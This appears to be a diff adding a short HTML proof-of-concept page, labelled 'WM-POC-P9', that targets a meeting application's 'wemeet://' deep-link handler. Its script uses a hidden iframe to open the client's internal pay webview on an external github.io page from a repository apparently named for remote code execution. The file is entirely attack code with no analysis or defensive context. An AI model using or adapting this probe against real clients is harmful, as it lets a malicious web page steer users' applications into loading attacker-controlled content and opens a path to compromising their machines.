@@ -1,0 +1,17 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P9</h1>
+<script>
+document.title='P9-START';
+var pay='https://gitwhs.github.io/wm-poc-rce/probe9pay.html';
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){
+  frame('wemeet://page/pay/webview?url='+encodeURIComponent(pay),'P9-PAY');
+}, 400);
+</script>
+</body></html>
